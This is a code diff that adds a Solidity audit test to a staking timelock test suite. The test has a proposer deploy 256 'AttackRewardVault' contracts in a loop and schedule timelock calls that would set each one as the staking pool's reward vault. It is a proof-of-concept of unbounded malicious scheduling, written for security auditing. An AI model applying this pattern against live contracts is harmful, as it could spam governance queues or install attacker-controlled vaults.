@@ -324,6 +324,39 @@ contract MyIntergrationTests is BaseTestTimelocked {
   }
 
   // @audit test passed
+  function test_CallForAFunctionCanBeScheduledByProposerAnyAmountOfTime() public {
+    uint256 delay = 31 days;
+
+    // deploying new malicious reward vault again and again
+    AttackRewardVault maliciousVault;
+    Timelock.Call[] memory calls = new Timelock.Call[](1);
+
+    changePrank(PROPOSER_ONE);
+    for (uint256 i; i < 256; i++) {
+      maliciousVault = new AttackRewardVault(
+          AttackRewardVault.ConstructorParams({
+            linkToken: s_LINK,
+            communityStakingPool: s_communityStakingPool,
+            operatorStakingPool: s_operatorStakingPool,
+            delegationRateDenominator: DELEGATION_RATE_DENOMINATOR,
+            initialMultiplierDuration: INITIAL_MULTIPLIER_DURATION,
+            adminRoleTransferDelay: ADMIN_ROLE_TRANSFER_DELAY
+          })
+        );
+
+      // creating a call and scheduling it
+
+      calls[0] = Timelock.Call({
+        target: address(s_operatorStakingPool),
+        value: 0,
+        data: abi.encodeWithSelector(StakingPoolBase.setRewardVault.selector, maliciousVault)
+      });
+
+      s_stakingTimelock.scheduleBatch(calls, NO_PREDECESSOR, EMPTY_SALT, delay);
+    }
+  }
+
+  // @audit test passed
   function test_CannotRaiseAlertInCaseOfAlertThresholdIsVeryLarge() public {
     uint256 delay = 31 days;
     uint32 priorityPeriodThresholdMax = type(uint32).max;
